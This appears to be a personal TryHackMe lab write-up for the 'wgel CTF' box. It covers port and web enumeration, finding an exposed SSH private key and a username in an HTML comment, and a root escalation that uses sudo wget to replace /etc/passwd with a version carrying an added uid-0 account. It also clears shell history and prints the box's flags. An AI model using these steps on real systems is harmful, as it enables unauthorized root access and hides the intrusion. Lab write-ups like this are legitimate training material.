# BOX NAME: wgel CTF
**LINK**: https://tryhackme.com/room/wgelctf

<details open><summary><ins>SUMMARY</ins></summary>

```
1. easy box. Enumerate hidden ssh-keys
2. find obscured username in web-root page
3. use wget to gain root
4. profit
5.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.10.75.61
[+] URL:	http://10.10.75.61
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
┌──(jml㉿kali)-[~/GIT/writeups/TryHackMe/wgel-ctf]
└─$ sudo nmap -sV -sC -A $IP -oN nmap.log        
[sudo] password for jml: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 07:08 CET
Nmap scan report for 10.10.75.61
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/22%OT=22%CT=1%CU=35809%PV=Y%DS=2%DC=T%G=Y%TM=658
OS:527E5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A
OS:)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)OPS(O1=M509ST11NW6%O2=M509
OS:ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST11)WIN(W1
OS:=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O
OS:=M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   53.83 ms 10.14.0.1
2   53.93 ms 10.10.75.61

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.11 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
┌──(jml㉿kali)-[~/GIT/writeups/TryHackMe/wgel-ctf]
└─$ whatweb $URL

http://10.10.75.61 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.75.61], Title[Apache2 Ubuntu Default Page: It works]


WHATWEB /sitemap


┌──(jml㉿kali)-[~/GIT/writeups/TryHackMe/wgel-ctf]
└─$ whatweb $URL/sitemap -v
WhatWeb report for http://10.10.75.61/sitemap
Status    : 301 Moved Permanently
Title     : 301 Moved Permanently
IP        : 10.10.75.61
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], RedirectLocation[http://10.10.75.61/sitemap/]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.18 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.18 (Ubuntu) (from server string)

[ RedirectLocation ]
        HTTP Server string location. used with http-status 301 and 
        302 

        String       : http://10.10.75.61/sitemap/ (from location)

HTTP Headers:
        HTTP/1.1 301 Moved Permanently
        Date: Fri, 22 Dec 2023 06:13:52 GMT
        Server: Apache/2.4.18 (Ubuntu)
        Location: http://10.10.75.61/sitemap/
        Content-Length: 312
        Connection: close
        Content-Type: text/html; charset=iso-8859-1

WhatWeb report for http://10.10.75.61/sitemap/
Status    : 200 OK
Title     : unapp Template
IP        : 10.10.75.61
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], Bootstrap, Email[info@yoursite.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], JQuery, Modernizr[2.6.2.min], Open-Graph-Protocol, Script, X-UA-Compatible[IE=edge]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.18 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with 
        HTML, CSS, and JS. 

        Website     : https://getbootstrap.com/

[ Email ]
        Extract email addresses. Find valid email address and 
        syntactically invalid email addresses from mailto: link 
        tags. We match syntactically invalid links containing 
        mailto: to catch anti-spam email addresses, eg. bob at 
        gmail.com. This uses the simplified email regular 
        expression from 
        http://www.regular-expressions.info/email.html for valid 
        email address matching. 

        String       : info@yoursite.com                                                                                                                                                                                                
        String       : info@yoursite.com                                                                                                                                                                                                
                                                                                                                                                                                                                                        
[ HTML5 ]                                                                                                                                                                                                                               
        HTML version 5, detected by the doctype declaration                                                                                                                                                                             
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
[ HTTPServer ]                                                                                                                                                                                                                          
        HTTP server header string. This plugin also attempts to                                                                                                                                                                                                                                                       
        identify the operating system from the server header.                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                      
        OS           : Ubuntu Linux                                                                                                                                                                                                                                                                                   
        String       : Apache/2.4.18 (Ubuntu) (from server string)                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                      
[ JQuery ]                                                                                                                                                                                                                                                                                                            
        A fast, concise, JavaScript that simplifies how to traverse                                                                                                                                                                                                                                                   
        HTML documents, handle events, perform animations, and add                                                                                                                                                                                                                                                    
        AJAX.                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                      
        Website     : http://jquery.com/                                                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                                                      
[ Modernizr ]                                                                                                                                                                                                                                                                                                         
        Modernizr adds classes to the <html> element which allow                                                                                                                                                                                                                                                      
        you to target specific browser functionality in your                                                                                                                                                                                                                                                          
        stylesheet. You don't actually need to write any Javascript                                                                                                                                                                                                                                                   
        to use it. [JavaScript]                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                      
        Version      : 2.6.2.min                                                                                                                                                                                                                                                                                      
        Website     : http://www.modernizr.com/                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                      
[ Open-Graph-Protocol ]                                                                                                                                                                                                                                                                                               
        The Open Graph protocol enables you to integrate your Web                                                                                                                                                                                                                                                     
        pages into the social graph. It is currently designed for                                                                                                                                                                                                                                                     
        Web pages representing profiles of real-world things .                                                                                                                                                                                                                                                        
        things like movies, sports teams, celebrities, and                                                                                                                                                                                                                                                            
        restaurants. Including Open Graph tags on your Web page,                                                                                                                                                                                                                                                      
        makes your page equivalent to a Facebook Page.                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                                                      
[ Script ]                                                                                                                                                                                                                                                                                                            
        This plugin detects instances of script HTML elements and                                                                                                                                                                                                                                                     
        returns the script language/type.                                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                                                      
[ X-UA-Compatible ]                                                                                                                                                                                                                                                                                                   
        This plugin retrieves the X-UA-Compatible value from the                                                                                                                                                                                                                                                      
        HTTP header and meta http-equiv tag. - More Info:                                                                                                                                                                                                                                                             
        http://msdn.microsoft.com/en-us/library/cc817574.aspx 

        String       : IE=edge

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 22 Dec 2023 06:13:53 GMT
        Server: Apache/2.4.18 (Ubuntu)
        Last-Modified: Sun, 13 May 2018 05:22:22 GMT
        ETag: "5258-56c0f8dbf7f80-gzip"
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 3940
        Connection: close
        Content-Type: text/html


```

nikto-scan
```
-> unecessary
```

fuzzing
```
└─$ ffuf -u $URL/FUZZ/ -w /base/wordlists/web-fuzz/raft-large-directories.txt -r | tee ffuf-dir.log

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.75.61/FUZZ/
 :: Wordlist         : FUZZ: /base/wordlists/web-fuzz/raft-large-directories.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

>>>> sitemap                 [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 116ms]
icons                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 54ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 57ms]
                        [Status: 200, Size: 11374, Words: 3512, Lines: 379, Duration: 55ms]



─$ ffuf -u $URL/sitemap/FUZZ/ -w /base/wordlists/web-fuzz/raft-large-files.txt -mc 200 | tee ffuf-files-sitemap.log

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.75.61/sitemap/FUZZ/
 :: Wordlist         : FUZZ: /base/wordlists/web-fuzz/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

.                       [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 83ms]
>>> .ssh                    [Status: 200, Size: 953, Words: 64, Lines: 17, Duration: 2242ms]

```
other
```
└─$ curl -s $URL/sitemap/.ssh/ | html2text
****** Index of /sitemap/.ssh ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       id_rsa           2019-10-26 09:24 1.6K  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.10.75.61 Port 80


curl $URL

 <!-- Jessie don't forget to udate the webiste -->

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```
jessie@CorpOne:~$ find / -perm -u=s -type f 2>/dev/null
/bin/ping6
/bin/ping
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd

```
**SGID's**:

```
jessie@CorpOne:~$ find / -perm -g=s -type f 2>/dev/null
/usr/bin/crontab                                                                                                                     
/usr/bin/bsd-write                                                                                                                   
/usr/bin/chage                                                                                                                       
/usr/bin/ssh-agent                                                                                                                   
/usr/bin/wall                                                                                                                                              
/usr/bin/mlocate                                                                                                                                           
/usr/bin/expiry                                                                                                                                            
/usr/lib/i386-linux-gnu/utempter/utempter                                                                                                                  
/usr/lib/snapd/snap-confine                                                                                                                                
/usr/lib/xorg/Xorg.wrap                                                                                                                                    
/usr/lib/evolution/camel-lock-helper-1.2                                                                                                                   
/sbin/pam_extrausers_chkpwd                                                                                                                                
/sbin/unix_chkpwd 
```
**OTHERS**:

```
jessie@CorpOne:~$ history -c
jessie@CorpOne:~$ unset HISTFILE
jessie@CorpOne:~$ file /bin/bash ; echo -e " \n" && lsb_release -a ; echo -e "\n" && uname -a
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib, for GNU/Linux 2.6.32, BuildID[sha1]=d8231516fa1d26d5df42026dfc622b77bf4a681d, stripped
 

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.6 LTS
Release:        16.04
Codename:       xenial


Linux CorpOne 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:19 UTC 2019 i686 i686 i686 GNU/Linux

///

jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
add jml:$1$pwnu$MZW1Fhe0G2102wwDfZSCY0:0:0:root:/root:/bin/bash to a modified passwd file.
use wget as sudo to get it and replace /etc/passwd on box.

sudo as jml.
profits?
```

```
root@CorpOne:/home/jessie# id
uid=0(root) gid=0(root) groups=0(root)


root@CorpOne:~# cat /home/jessie/Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6

```

```
root@CorpOne:~# cat root_flag.txt 
b1b968b37519ad1daa6408188649263d

```

</details>